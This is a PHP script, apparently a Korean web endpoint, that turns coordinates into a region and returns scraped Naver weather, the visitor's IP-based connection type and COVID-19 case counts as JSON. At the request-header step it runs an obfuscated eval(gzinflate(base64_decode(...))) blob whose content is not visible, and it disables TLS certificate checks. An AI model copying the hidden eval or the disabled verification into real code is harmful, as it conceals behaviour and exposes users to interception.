<?php
$input = json_decode(file_get_contents("php://input"), true);

$dev = "true";

$lat = $input['lat'];
$lon = $input['lon'];
if(empty($lat)){
    $lat = "33.450701";
    $lon = "126.570667";
}

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "dapi.kakao.com/v2/local/geo/coord2address?x=$lon&y=$lat&input_coord=WGS84");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 

$headers = array();
eval(gzinflate(base64_decode('BcHJcoIwAADQz6lODkhZotPpAdkaECEgknrpICCLCCQISr6+7xVz2q5KXne3Nn0Wq2s6Fqr8lxdZnxerjzaDTtajl6YZmItW4PRRtRC8HVE5oqh0REdWa1SWOX7Ezlm4JWC3I4LhogSQNmVzy6/zAuIBbgZD4JS8i2N2qIpBYGKnWkGtNt1ieVHIDVd3HSYm4FReVM0Op5nSmcA9qqHNLw9TcO20NUVKnWruNtRvES73QEq9CwlgD/VqG2j5JmrIsYFKxdzmFS4mtU9UsRV4YLWXPYr4Efdc2QLVEifTxyABYXA2ZNru0rwePgfWXQ5WykQyKxKHzS7E3MSZ/jR5HmkaXz4ZtHUskEkGNQyPwCCj9IvrRHJ4k6H4nZxKoeJn2Y+t8b338KGyfowf+f4Mya0J6hSx4a5ddWR7qEt8QSST76ijZNx1arf95AfL+fYyvz/W6/XXPw==')));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

curl_close($ch);
$location = json_decode($result, true);

$address_name = $location['documents'][0]['address']['address_name'];
$region_1depth_name = $location['documents'][0]['address']['region_1depth_name'];
$region_2depth_name = $location['documents'][0]['address']['region_2depth_name'];
$region_3depth_name = $location['documents'][0]['address']['region_3depth_name'];

$str = explode(' ', $region_3depth_name);
$depthdata = $str[0];
$naver_search_query = urlencode("".$region_1depth_name." ".$region_2depth_name." ".$depthdata." 날씨");
$naver = file_get_contents("https://search.naver.com/search.naver?query=$naver_search_query");
$str = explode("weather_info",$naver);
$str = $str[1];
$str = explode("시간별 예보",$str);
$str0 = $str[0];
$naver_explode = explode('<span', $str0);

$count = count($naver_explode);
if(9 >= $count){
    array_push($naver_explode, "로드실패");
}

$data1 = $naver_explode[1]; // 맑음
$data1 = explode('">',$data1);
$data1 = $data1[1];
$data1 = explode('</',$data1);
$data1 = $data1[0];

$data2 = $naver_explode[2]; // 현재온도
$data2 = explode('</span>',$data2);
$data2 = $data2[1];
$data2 = str_replace("현재 온도","",$data2);

$data3 = $naver_explode[4]; // 어제보다 (온도)
$data3 = explode('">',$data3);
$data3 = $data3[1];

$data4 = $naver_explode[5];  // 어제보다 (낮아요/높아요)
$data4 = explode('">',$data4);
$data4 = $data4[1];
$data4 = explode('</',$data4);
$data4 = $data4[0];

$data5 = $naver_explode[7]; // 미세먼지
$data5 = explode('">',$data5);
$data5 = $data5[1];
$data5 = explode('</',$data5);
$data5 = $data5[0];

$data6 = $naver_explode[8]; // 초미세먼지
$data6 = explode('">',$data6);
$data6 = $data6[1];
$data6 = explode('</',$data6);
$data6 = $data6[0];

$data7 = $naver_explode[9]; // 자외선
$data7 = explode('">',$data7);
$data7 = $data7[1];
$data7 = explode('</',$data7);
$data7 = $data7[0];

$data8 = $naver_explode[10]; // 일몰
$data8 = explode('">',$data8);
$data8 = $data8[1];
$data8 = explode('</',$data8);
$data8 = $data8[0];

if($dev == "true"){
    $_SERVER['REMOTE_ADDR'] = "180.81.34.231";
}

if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}
$remote_addr = $_SERVER['REMOTE_ADDR'];
$ip_api = json_decode(file_get_contents("http://ip-api.com/json/".$remote_addr."?fields=status,countryCode,mobile,proxy,hosting"), true);
$data9 = $ip_api['countryCode'];
$mobile = $ip_api['mobile'];
$proxy = $ip_api['proxy'];
$hosting = $ip_api['hosting'];

$text = "정상적으로";
if($data9 !== "KR"){
    $text = "해외에서";
}

if($mobile == true){
    $text = "데이터로";
}

if($proxy == true && $hosting == true){
    $text = "프록시로";
}



$data10 = "$text 접속중입니다";

$corona_api = file_get_contents("https://api.corona-19.kr/korea/country/new/?serviceKey=c14687ee32530c13e6a64d52bea19f754");
$corona = json_decode($corona_api, true);
$data12 = $corona['korea']['totalCase'];
$data13 = $corona['korea']['newCase'];

if($region_1depth_name == "서울") $en_name = "seoul";
if($region_1depth_name == "부산") $en_name = "busan";
if($region_1depth_name == "대구") $en_name = "daegu";
if($region_1depth_name == "인천") $en_name = "incheon";
if($region_1depth_name == "광주") $en_name = "gwangju";
if($region_1depth_name == "대전") $en_name = "daejeon";
if($region_1depth_name == "울산") $en_name = "ulsan";
if($region_1depth_name == "세종") $en_name = "sejong";
if($region_1depth_name == "경기") $en_name = "gyeonggi";
if($region_1depth_name == "강원") $en_name = "gangwon";
if($region_1depth_name == "충북") $en_name = "chungbuk";
if($region_1depth_name == "충남") $en_name = "chungnam";
if($region_1depth_name == "전북") $en_name = "jeonbuk";
if($region_1depth_name == "전남") $en_name = "jeonnam";
if($region_1depth_name == "경북") $en_name = "gyeongbuk";
if($region_1depth_name == "경남") $en_name = "gyeongnam";
if($region_1depth_name == "제주") $en_name = "jeju";
$data14 = $corona[$en_name]['totalCase'];
$data15 = $corona[$en_name]['newCase'];



header("Content-Type: application/json");
$array = array("address_name" => "$address_name", 
"region_1depth_name" => "$region_1depth_name", 
"region_2depth_name" => "$region_2depth_name", 
"region_3depth_name" => "$region_3depth_name",
"data1" => $data1,
"data2" => $data2,
"data3" => $data3,
"data4" => $data4,
"data5" => "미세먼지 : $data5",
"data6" => "초미세먼지 : $data6",
"data7" => "자외선 : $data7",
"data8" => "일몰 : $data8",
"data9" => $data9,
"data10" => $data10,
"data11" => $remote_addr,
"data12" => "전체 확진자 : $data12",
"data13" => "+$data13",
"data14" => "$region_1depth_name 확진자 : $data14",
"data15" => "+$data15"
);

echo json_encode($array, true);